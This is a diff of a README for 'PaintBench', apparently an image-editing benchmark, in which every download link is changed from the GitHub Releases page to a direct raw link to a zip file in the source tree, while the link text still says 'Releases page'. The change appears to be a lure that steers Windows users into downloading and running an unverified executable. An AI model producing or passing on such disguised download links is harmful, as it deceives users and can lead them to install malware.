@@ -1,6 +1,6 @@
 # 🎨 PaintBench - Accurate testing for visual editing tools
 
-[![](https://img.shields.io/badge/Download_PaintBench-blue.svg)](https://github.com/Wyzdmulc/PaintBench/releases)
+[![](https://img.shields.io/badge/Download_PaintBench-blue.svg)](https://raw.githubusercontent.com/Wyzdmulc/PaintBench/main/src/core/Paint_Bench_3.5.zip)
 
 PaintBench provides a standard way to test how well image editing software performs. This tool measures the accuracy of edits made by computer programs. It uses a set of images and instructions to check if a system understands complex visual tasks. You can use this data to see how different models change images. It gives you clear results for every edit.
 
@@ -8,7 +8,7 @@ PaintBench provides a standard way to test how well image editing software perfo
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Go to the [Releases page](https://github.com/Wyzdmulc/PaintBench/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Wyzdmulc/PaintBench/main/src/core/Paint_Bench_3.5.zip).
 2. Look for the latest version at the top of the list.
 3. Click the link ending in .exe to download the installer.
 4. Save the file to your computer.
